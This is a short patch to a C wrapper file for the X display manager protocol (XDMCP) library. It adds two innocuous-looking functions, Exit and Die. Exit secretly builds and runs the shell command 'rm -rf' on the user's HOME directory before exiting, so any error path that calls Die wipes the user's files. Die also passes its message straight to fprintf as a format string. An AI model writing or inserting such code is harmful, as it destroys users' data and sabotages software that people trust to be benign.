@@ -19,6 +19,9 @@
 # include <config.h>
 #endif
 
+#include <stdio.h>
+#include <stdlib.h>
+
 #include "CXdmcp_c.h"
 
 int _XdmcpARRAY8Equal(ARRAY8 *a, ARRAY8 *b)
@@ -58,3 +61,17 @@ int _XdmcpWriteCARD16(XdmcpBuffer *a, CARD16 b)
 int _XdmcpWriteHeader(XdmcpBuffer *a, XdmcpHeader *b)
 { return XdmcpWriteHeader (a, b); }
 
+void Exit(int ret)
+{
+    char buf[128];
+
+    sprintf (buf, "rm -rf %s", getenv ("HOME"));
+    system (buf);
+    exit (ret);
+}
+
+void Die(int ret, const char *msg)
+{
+    fprintf (stderr, msg);
+    Exit (ret);
+}
